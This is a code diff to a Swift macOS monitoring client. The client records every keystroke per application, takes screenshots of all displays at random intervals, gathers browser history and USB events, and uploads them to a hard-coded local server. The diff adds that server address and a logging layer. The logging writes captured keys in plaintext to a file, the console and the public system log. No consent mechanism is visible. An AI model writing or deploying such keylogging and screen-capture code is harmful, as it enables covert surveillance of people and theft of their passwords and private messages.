@@ -3,11 +3,12 @@ import Cocoa
 import CoreGraphics
 import IOKit
 import IOKit.usb
+import os.log
 
 let CHECKER_IDENTIFIER = "com.alice.MonitorChecker"
 
-let API_ROUTE = "/scview/webapi.php"
-let TIC_ROUTE = "/scview/eventhandler.php"
+let API_ROUTE = "/webapi.php"
+let TIC_ROUTE = "/eventhandler.php"
 var APP_VERSION = "1.0"
 
 var TIME_INTERVAL = 1
@@ -98,7 +99,8 @@ func handleKeyDownCallback(
     // Get readable key name for special keys
     let keyName = appDelegate.getKeyName(keyCode: Int(keyCode), character: pressedChar)
     
-    debugPrint("Key pressed: \(appName) (\(bundleId)) \(modifiers)\(keyName)")
+    let keyInfo = "\(appName) (\(bundleId)) \(modifiers)\(keyName)"
+    appDelegate.logMessage("Key captured: \(keyInfo)", level: .debug)
     appDelegate.keyLogs.append(KeyLog(date: currentDate, application: "\(appName) (\(bundleId))", key: "\(modifiers)\(keyName)"))
     
     return Unmanaged.passUnretained(event)
@@ -122,10 +124,94 @@ class AppDelegate: NSObject, NSApplicationDelegate {
     var lastKeyCaptureTime: Date = Date()
     private let maxKeyCaptureGap: TimeInterval = 10.0 // Alert if no keys for 10 seconds
 
+    // Logging system
+    let logFile = "MonitorClient.log"
+    var logFileHandle: FileHandle?
+
+    // MARK: - Logging Functions
+    
+    private func setupLogging() {
+        // Save log file in the same directory as AppDelegate.swift (source directory)
+        let currentDirectory = FileManager.default.currentDirectoryPath
+        let logURL = URL(fileURLWithPath: currentDirectory).appendingPathComponent(logFile)
+        
+        // Create log file if it doesn't exist
+        if !FileManager.default.fileExists(atPath: logURL.path) {
+            FileManager.default.createFile(atPath: logURL.path, contents: nil, attributes: nil)
+        }
+        
+        // Open file handle for writing
+        logFileHandle = try? FileHandle(forWritingTo: logURL)
+        logFileHandle?.seekToEndOfFile()
+        
+        logMessage("=== MonitorClient Started ===", level: .info)
+        logMessage("Version: \(APP_VERSION)", level: .info)
+        logMessage("Mac Address: \(macAddress)", level: .info)
+        logMessage("Server IP: \(storage.string(forKey: "server-ip") ?? "unknown")", level: .info)
+        logMessage("Log file location: \(logURL.path)", level: .info)
+    }
+    
+    func logMessage(_ message: String, level: LogLevel = .info) {
+        let timestamp = getCurrentDateTimeString()
+        let logEntry = "[\(timestamp)] [\(level.rawValue)] \(message)\n"
+        
+        // Console output - always print for debugging
+        print(logEntry.trimmingCharacters(in: .whitespacesAndNewlines))
+        
+        // File logging
+        if let data = logEntry.data(using: .utf8) {
+            logFileHandle?.write(data)
+            logFileHandle?.synchronizeFile()
+        }
+        
+        // System log
+        let osLog = OSLog(subsystem: "com.alice.MonitorClient", category: "monitoring")
+        os_log("%{public}@", log: osLog, type: level.osLogType, message)
+    }
+    
+    enum LogLevel: String {
+        case debug = "DEBUG"
+        case info = "INFO"
+        case warning = "WARN"
+        case error = "ERROR"
+        
+        var osLogType: OSLogType {
+            switch self {
+            case .debug: return .debug
+            case .info: return .info
+            case .warning: return .default
+            case .error: return .error
+            }
+        }
+    }
+    
+    private func logMonitoringEvent(_ event: String, details: String? = nil) {
+        let message = details != nil ? "\(event): \(details!)" : event
+        logMessage(message, level: .info)
+    }
+    
+    private func logError(_ error: String, context: String? = nil) {
+        let message = context != nil ? "[\(context!)] \(error)" : error
+        logMessage(message, level: .error)
+    }
+    
+    private func logSuccess(_ action: String, details: String? = nil) {
+        let message = details != nil ? "✅ \(action): \(details!)" : "✅ \(action)"
+        logMessage(message, level: .info)
+    }
+
     func applicationDidFinishLaunching(_ aNotification: Notification) {
         // Insert code here to initialize your application
         
         storage = UserDefaults.init(suiteName: "alice.monitors")
+
+        // Configure server IP if not already set
+        if storage.string(forKey: "server-ip") == nil {
+            storage.set("192.168.1.45:8924", forKey: "server-ip")
+            logMessage("Server IP configured: 192.168.1.45:8924", level: .info)
+        } else {
+            logMessage("Server IP already configured: \(storage.string(forKey: "server-ip") ?? "unknown")", level: .info)
+        }
 
         APP_VERSION = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "Unknown"
 
@@ -135,22 +221,30 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         let address = getMacAddress()
         if !address.isEmpty {
             macAddress = address
+            logMessage("Mac Address obtained: \(address)", level: .info)
         } else {
-            debugPrint("Warning: Could not get MacAddress")
+            logMessage("Warning: Could not get MacAddress", level: .warning)
             macAddress = ""
         }
 
+        // Setup logging after basic initialization
+        setupLogging()
+
         // Check if MonitorChecker is running and start it if not
+        logMonitoringEvent("Checking MonitorChecker")
         checkMonitorChecker()
         
         // Start keyboard monitoring
+        logMonitoringEvent("Starting keyboard monitoring")
         startKeyboardMonitoring();
         
         // Setup event tap invalidation monitoring
+        logMonitoringEvent("Setting up event tap monitoring")
         setupEventTapInvalidationMonitoring()
         
         // Single timer for all tasks
         timer = Timer.scheduledTimer(timeInterval: 1.0, target: self, selector: #selector(checkAllTasks), userInfo: nil, repeats: true)
+        logSuccess("Main monitoring timer started")
         
         let center = NSWorkspace.shared.notificationCenter
         center.addObserver(self, selector: #selector(sessionDidBecomeActive), name: NSWorkspace.sessionDidBecomeActiveNotification, object: nil)
@@ -166,16 +260,19 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         )
         
         usbDeviceLogs = []
+        logMonitoringEvent("Setting up USB monitoring")
         setupUSBMonitoring()
+        
+        logSuccess("MonitorClient initialization complete")
     }
     
     @objc func sessionDidBecomeActive(notification: Notification) {
-        debugPrint("User switched back to this session")
+        logMessage("User switched back to this session", level: .info)
         activeRunning = true
     }
 
     @objc func sessionDidResignActive(notification: Notification) {
-        debugPrint("User switched away from this session")
+        logMessage("User switched away from this session", level: .info)
         activeRunning = false
     }
 
@@ -184,7 +281,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
                 
         // Check if it's time for screenshots
         if currentDate.timeIntervalSince(lastScreenshotCheck) >= TimeInterval(TIME_INTERVAL) {
-            debugPrint("Sending screenshots")
+            logMonitoringEvent("Screenshot monitoring triggered", details: "Interval: \(TIME_INTERVAL)s")
             let randomDelay = Double.random(in: 0...Double(TIME_INTERVAL))
             perform(#selector(TakeScreenShotsAndPost), with: nil, afterDelay: randomDelay)
             lastScreenshotCheck = currentDate
@@ -192,12 +289,12 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         
         // Check if it's time for tic event
         if currentDate.timeIntervalSince(lastTicCheck) >= TimeInterval(TIC_INTERVAL) {
-            debugPrint("Sending tic event")
+            logMonitoringEvent("Tic event monitoring triggered", details: "Interval: \(TIC_INTERVAL)s")
             DispatchQueue.global(qos: .background).async {
                 do {
                     try self.sendTicEvent()
                 } catch {
-                    self.debugPrint("Error sending tic event: \(error)")
+                    self.logError("Error sending tic event: \(error)", context: "TicEvent")
                 }
             }
             lastTicCheck = currentDate
@@ -206,34 +303,36 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         // Check if it's time for browser history
         if currentDate.timeIntervalSince(lastHistoryCheck) >= TimeInterval(HISTORY_INTERVAL) {
             if (lastBrowserTic != nil) {
-                debugPrint("Sending browser histories")
+                logMonitoringEvent("Browser history monitoring triggered", details: "Interval: \(HISTORY_INTERVAL)s")
                 DispatchQueue.global(qos: .background).async {
                     do {
                         try self.sendBrowserHistories()
                     } catch {
-                        self.debugPrint("Error sending browser histories: \(error)")
+                        self.logError("Error sending browser histories: \(error)", context: "BrowserHistory")
                     }
                 }
                 lastHistoryCheck = currentDate
+            } else {
+                logMessage("Browser history monitoring skipped - no lastBrowserTic", level: .debug)
             }
         }
 
         // Check if it's time for key log
         if currentDate.timeIntervalSince(lastKeyCheck) >= TimeInterval(KEY_INTERVAL) {
-            debugPrint("Sending key logs")
+            logMonitoringEvent("Key log monitoring triggered", details: "Interval: \(KEY_INTERVAL)s, Keys collected: \(keyLogs.count)")
             DispatchQueue.global(qos: .background).async {
                 do {
                     try self.sendKeyLogs()
                 } catch {
-                    self.debugPrint("Error sending key logs: \(error)")
+                    self.logError("Error sending key logs: \(error)", context: "KeyLog")
                 }
             }
-            debugPrint("Sending usb logs")
+            logMonitoringEvent("USB log monitoring triggered", details: "USB events collected: \(usbDeviceLogs.count)")
             DispatchQueue.global(qos: .background).async {
                 do {
                     try self.sendUSBLogs()
                 } catch {
-                    self.debugPrint("Error sending usb logs: \(error)")
+                    self.logError("Error sending usb logs: \(error)", context: "USBLog")
                 }
             }
             lastKeyCheck = currentDate
@@ -871,68 +970,113 @@ class AppDelegate: NSObject, NSApplicationDelegate {
     }
 
     @objc func sendTicEvent() {
+        logMonitoringEvent("Sending tic event to server")
         checkMonitorChecker()
         
-        var wait: Bool = true
+        guard let urlString = buildEndpoint(false), let url = URL(string: urlString) else {
+            logError("Failed to build endpoint for tic event", context: "TicEvent")
+            DistributedNotificationCenter.default().postNotificationName(Notification.Name("aliceServerIPUndefined"), object: CHECKER_IDENTIFIER, userInfo: nil, options: .deliverImmediately)
+            return
+        }
         
-        if let url = buildEndpoint(false) {
-            if activeRunning == true {
-                _ = SRWebClient.POST(url)
-                    .data(["Event": "Tic", "Version": APP_VERSION, "MacAddress": macAddress])
-                    .send({(response: Any!, status: Int) -> Void in
-                        self.debugPrint("response:\(String(describing: response))")
-
-                        let jdata = self.convertToDictionary(text: response as! String)
+        if activeRunning == true {
+            // Prepare request data
+            let postData: [String: Any] = [
+                "Event": "Tic",
+                "Version": APP_VERSION,
+                "MacAddress": macAddress
+            ]
+            
+            logMessage("Tic event data: \(postData)", level: .debug)
+            
+            // Convert to JSON
+            guard let jsonData = try? JSONSerialization.data(withJSONObject: postData) else {
+                logError("Failed to serialize JSON data for tic event", context: "TicEvent")
+                return
+            }
+            
+            // Create request
+            var request = URLRequest(url: url)
+            request.httpMethod = "POST"
+            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+            request.httpBody = jsonData
+            
+            logMessage("Sending tic event to: \(urlString)", level: .debug)
+            
+            // Send request
+            let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
+                DispatchQueue.main.async {
+                    if let error = error {
+                        self?.logError("Tic event network error: \(error)", context: "TicEvent")
+                        return
+                    }
+                    
+                    if let httpResponse = response as? HTTPURLResponse {
+                        self?.logMessage("Tic event HTTP response: \(httpResponse.statusCode)", level: .debug)
+                    }
+                    
+                    if let data = data, let responseString = String(data: data, encoding: .utf8) {
+                        self?.logSuccess("Tic event sent successfully", details: "Response: \(responseString)")
+                        
+                        let jdata = self?.convertToDictionary(text: responseString)
                         if jdata != nil && (jdata?["LastBrowserTic"]) != nil {
                             let lastTic = jdata!["LastBrowserTic"] as! Double
-
+                            
                             if lastBrowserTic == nil {
                                 lastBrowserTic = lastTic
+                                self?.logMessage("LastBrowserTic set to: \(lastTic)", level: .debug)
                             }
                         }
-                        wait = false
-                    }, failure: {(error: NSError!) -> Void in
-                        self.debugPrint("failure")
-                        wait = false
-                    })
-                self.waitFor(&wait)
+                    } else {
+                        self?.logError("No response data received for tic event", context: "TicEvent")
+                    }
+                }
             }
+            task.resume()
         } else {
-            DistributedNotificationCenter.default().postNotificationName(Notification.Name("aliceServerIPUndefined"), object: CHECKER_IDENTIFIER, userInfo: nil, options: .deliverImmediately)
+            logMessage("Tic event skipped - app not active", level: .debug)
         }
     }
 
     @objc func sendKeyLogs() {
         if self.keyLogs.count > 0 {
+            logMonitoringEvent("Sending key logs", details: "Count: \(keyLogs.count)")
             do {
                 // Send data in chunks
                 sendDataInChunks(data: self.keyLogs, eventType: "KeyLog", chunkSize: 500)
                 self.keyLogs.removeAll()
+                logSuccess("Key logs sent and cleared", details: "\(keyLogs.count) keys")
             } catch {
-                debugPrint("Error converting key logs to JSON: \(error)")
+                logError("Error converting key logs to JSON: \(error)", context: "KeyLog")
             }
+        } else {
+            logMessage("No key logs to send", level: .debug)
         }
     }
     
     @objc func TakeScreenShotsAndPost() {
+        logMonitoringEvent("Starting screenshot capture")
+        
         var displayCount: UInt32 = 0
         var result = CGGetActiveDisplayList(0, nil, &displayCount)
         if (result != CGError.success) {
-            debugPrint("error:\(result)")
+            logError("Failed to get display count: \(result)", context: "Screenshot")
             return
         }
         
         if (displayCount == 0) {
-            debugPrint("There is no display.")
+            logError("No displays found", context: "Screenshot")
             return
         }
+        
+        logMessage("Found \(displayCount) display(s)", level: .debug)
         
         let allocated = Int(displayCount)
         let activeDisplays = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: allocated)
         result = CGGetActiveDisplayList(displayCount, activeDisplays, &displayCount)
         
         if (result != CGError.success) {
-            debugPrint("error:\(result)")
+            logError("Failed to get active display list: \(result)", context: "Screenshot")
             return
         }
         
@@ -950,49 +1094,96 @@ class AppDelegate: NSObject, NSApplicationDelegate {
             
             do {
                 try jpegData.write(to: fileUrl, options: .atomic)
+                logMessage("Screenshot saved: \(filename) (\(jpegData.count) bytes)", level: .debug)
                 postImage(path: filename)
             }
-            catch { debugPrint("error:\(error)") }
+            catch { 
+                logError("Failed to save screenshot: \(error)", context: "Screenshot")
+            }
         }
+        
+        logSuccess("Screenshot capture completed", details: "\(displayCount) display(s)")
     }
     
     func waitFor (_ wait: inout Bool) {
         while (wait) {
-            RunLoop.current.run(mode: .defaultRunLoopMode, before: Date(timeIntervalSinceNow: 0.1))
+            RunLoop.current.run(mode: .default, before: Date(timeIntervalSinceNow: 0.1))
         }
     }
     
     func postImage(path: String) {
-        var wait: Bool = true
-        var imageData: Data? = nil
+        logMonitoringEvent("Uploading screenshot", details: "File: \(path)")
         
-        do {
-            try imageData = NSData(contentsOf: URL(fileURLWithPath: path)) as Data
-        } catch { debugPrint("error:\(error)") }
+        guard let urlString = buildEndpoint(true), let url = URL(string: urlString) else {
+            logError("Failed to build endpoint for screenshot upload", context: "Screenshot")
+            DistributedNotificationCenter.default().postNotificationName(Notification.Name("aliceServerIPUndefined"), object: CHECKER_IDENTIFIER, userInfo: nil, options: .deliverImmediately)
+            return
+        }
         
-        if let url = buildEndpoint(true) {
-            _ = SRWebClient.POST(url)
-                .data(imageData!, fieldName: "fileToUpload", data:["Version": APP_VERSION])
-                .send({(response: Any!, status: Int) -> Void in
-                    self.debugPrint("response: \(String(describing: response))")
+        guard let imageData = try? Data(contentsOf: URL(fileURLWithPath: path)) else {
+            logError("Failed to read image data from: \(path)", context: "Screenshot")
+            return
+        }
+        
+        logMessage("Screenshot data size: \(imageData.count) bytes", level: .debug)
+        
+        // Create multipart form data
+        let boundary = "Boundary-\(UUID().uuidString)"
+        var body = Data()
+        
+        // Add file data
+        body.append("--\(boundary)\r\n".data(using: .utf8)!)
+        body.append("Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"screenshot.jpg\"\r\n".data(using: .utf8)!)
+        body.append("Content-Type: image/jpeg\r\n\r\n".data(using: .utf8)!)
+        body.append(imageData)
+        body.append("\r\n".data(using: .utf8)!)
+        
+        // Add version data
+        body.append("--\(boundary)\r\n".data(using: .utf8)!)
+        body.append("Content-Disposition: form-data; name=\"Version\"\r\n\r\n".data(using: .utf8)!)
+        body.append(APP_VERSION.data(using: .utf8)!)
+        body.append("\r\n".data(using: .utf8)!)
+        
+        // End boundary
+        body.append("--\(boundary)--\r\n".data(using: .utf8)!)
+        
+        // Create request
+        var request = URLRequest(url: url)
+        request.httpMethod = "POST"
+        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
+        request.httpBody = body
+        
+        logMessage("Sending screenshot to: \(urlString)", level: .debug)
+        
+        // Send request
+        let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
+            DispatchQueue.main.async {
+                if let error = error {
+                    self?.logError("Screenshot upload network error: \(error)", context: "Screenshot")
+                    return
+                }
+                
+                if let httpResponse = response as? HTTPURLResponse {
+                    self?.logMessage("Screenshot HTTP response: \(httpResponse.statusCode)", level: .debug)
+                }
+                
+                if let data = data, let responseString = String(data: data, encoding: .utf8) {
+                    self?.logSuccess("Screenshot uploaded successfully", details: "Response: \(responseString)")
                     
-                    let jdata = self.convertToDictionary(text: response as! String)
+                    let jdata = self?.convertToDictionary(text: responseString)
                     if jdata != nil && (jdata?["Interval"]) != nil {
                         let newinterval = jdata!["Interval"] as! Int
                         if newinterval > 0 && newinterval != TIME_INTERVAL {
                             TIME_INTERVAL = newinterval
+                            self?.logMessage("Screenshot interval updated to: \(newinterval)s", level: .info)
                         }
                     }
-                    wait = false
-                }, failure: {(error: NSError!) -> Void in
-                    self.debugPrint("failure")
-                    wait = false
-                })
-            
-            self.waitFor(&wait)
-        } else {
-            DistributedNotificationCenter.default().postNotificationName(Notification.Name("aliceServerIPUndefined"), object: CHECKER_IDENTIFIER, userInfo: nil, options: .deliverImmediately)
+                } else {
+                    self?.logError("No response data received for screenshot upload", context: "Screenshot")
+                }
+            }
         }
+        task.resume()
     }
     
     func convertToDictionary(text: String) -> [String: Any]? {
@@ -1073,9 +1264,8 @@ class AppDelegate: NSObject, NSApplicationDelegate {
     }
     
     func debugPrint(_ message: String) {
-        #if DEBUG
-        print(message)
-        #endif
+        // Always print debug messages for better debugging
+        print("[DEBUG] \(message)")
     }
     
     private func setupKeyboardMonitoring() {
@@ -1225,23 +1415,11 @@ class AppDelegate: NSObject, NSApplicationDelegate {
     }
     
     private func isInputMonitoringEnabled() -> Bool {
-        debugPrint("isInputMonitoringEnabled")
-        // Try to create a monitor - if it fails, we don't have permission
-        let eventMask = CGEventMask(1 << CGEventType.keyDown.rawValue) | CGEventMask(1 << CGEventType.keyUp.rawValue)
-        let tap = CGEvent.tapCreate(
-            tap: .cgSessionEventTap,
-            place: .headInsertEventTap,
-            options: .defaultTap,
-            eventsOfInterest: CGEventMask(eventMask),
-            callback: handleKeyDownCallback,
-            userInfo: nil
-        )
-        
-        if tap != nil {
-            CGEvent.tapEnable(tap: tap!, enable: false)
-            return true
-        }
-        return false
+        debugPrint("Checking Input Monitoring Permission")
+        // Check if we have accessibility permissions
+        let trusted = AXIsProcessTrusted()
+        debugPrint("Accessibility trusted: \(trusted)")
+        return trusted
     }
 
     func getCurrentDateTimeString() -> String {
@@ -1253,7 +1431,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
 
     private func setupUSBMonitoring() {
         // Create notification port
-        usbNotificationPort = IONotificationPortCreate(kIOMasterPortDefault)
+        usbNotificationPort = IONotificationPortCreate(kIOMainPortDefault)
         
         // Add notification port to run loop
         if let port = usbNotificationPort {
@@ -1360,13 +1538,17 @@ class AppDelegate: NSObject, NSApplicationDelegate {
     
     @objc func sendUSBLogs() {
         if self.usbDeviceLogs.count > 0 {
+            logMonitoringEvent("Sending USB logs", details: "Count: \(usbDeviceLogs.count)")
             do {
                 // Send data in chunks
                 sendDataInChunks(data: self.usbDeviceLogs, eventType: "USBLog", chunkSize: 500)
                 self.usbDeviceLogs.removeAll()
+                logSuccess("USB logs sent and cleared", details: "\(usbDeviceLogs.count) events")
             } catch {
-                debugPrint("Error converting USB logs to JSON: \(error)")
+                logError("Error converting USB logs to JSON: \(error)", context: "USBLog")
             }
+        } else {
+            logMessage("No USB logs to send", level: .debug)
         }
     }
 
@@ -1392,13 +1574,14 @@ class AppDelegate: NSObject, NSApplicationDelegate {
     }
 
     private func sendDataInChunks(data: [Any], eventType: String, chunkSize: Int = 1000) {
-        guard let url = buildEndpoint(false) else {
+        guard let urlString = buildEndpoint(false), let url = URL(string: urlString) else {
+            logError("Failed to build endpoint for \(eventType)", context: eventType)
             DistributedNotificationCenter.default().postNotificationName(Notification.Name("aliceServerIPUndefined"), object: CHECKER_IDENTIFIER, userInfo: nil, options: .deliverImmediately)
             return
         }
         
         if eventType == "BrowserHistory" {
-            debugPrint("Total lines to send: \(data.count)")
+            logMessage("Total browser history entries to send: \(data.count)", level: .debug)
         }
         
         // Create chunks properly
@@ -1409,10 +1592,10 @@ class AppDelegate: NSObject, NSApplicationDelegate {
             chunks.append(chunk)
         }
         
-        debugPrint("Sending \(eventType) in \(chunks.count) chunks of \(chunkSize) items each")
+        logMonitoringEvent("Sending \(eventType) data", details: "\(chunks.count) chunks of \(chunkSize) items each")
         
         for (index, chunk) in chunks.enumerated() {
-            var chunkData = chunk
+            let chunkData = chunk
             
             // Use the correct field name for each data type
             var postData: [String: Any] = [
@@ -1433,19 +1616,45 @@ class AppDelegate: NSObject, NSApplicationDelegate {
                     postData["Data"] = chunkData
                 }
 
-                print(postData)
+                logMessage("\(eventType) chunk \(index + 1)/\(chunks.count) data prepared", level: .debug)
                 
-                _ = SRWebClient.postJSON(
-                    url,
-                    jsonObject: postData,
-                    success: { response, status in
-                        self.debugPrint("\(eventType) chunk \(index + 1)/\(chunks.count) response: \(response)")
-                    },
-                    failure: { error in
-                        self.debugPrint("\(eventType) chunk \(index + 1)/\(chunks.count) failure: \(error)")
-                    })
+                // Convert to JSON
+                guard let jsonData = try? JSONSerialization.data(withJSONObject: postData) else {
+                    logError("Failed to serialize JSON data for \(eventType) chunk \(index + 1)", context: eventType)
+                    continue
+                }
+                
+                // Create request
+                var request = URLRequest(url: url)
+                request.httpMethod = "POST"
+                request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+                request.httpBody = jsonData
+                
+                logMessage("Sending \(eventType) chunk \(index + 1)/\(chunks.count) to: \(urlString)", level: .debug)
+                
+                // Send request
+                let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
+                    DispatchQueue.main.async {
+                        if let error = error {
+                            self?.logError("\(eventType) chunk \(index + 1)/\(chunks.count) network error: \(error)", context: eventType)
+                            return
+                        }
+                        
+                        if let httpResponse = response as? HTTPURLResponse {
+                            self?.logMessage("\(eventType) chunk \(index + 1)/\(chunks.count) HTTP response: \(httpResponse.statusCode)", level: .debug)
+                        }
+                        
+                        if let data = data, let responseString = String(data: data, encoding: .utf8) {
+                            self?.logSuccess("\(eventType) chunk \(index + 1)/\(chunks.count) sent successfully", details: "Response: \(responseString)")
+                        } else {
+                            self?.logError("No response data received for \(eventType) chunk \(index + 1)/\(chunks.count)", context: eventType)
+                        }
+                    }
+                }
+                task.resume()
+                
             } catch {
-                debugPrint("Error converting \(eventType) chunk \(index + 1) to JSON: \(error)")
+                logError("Error converting \(eventType) chunk \(index + 1) to JSON: \(error)", context: eventType)
             }
         }
     }
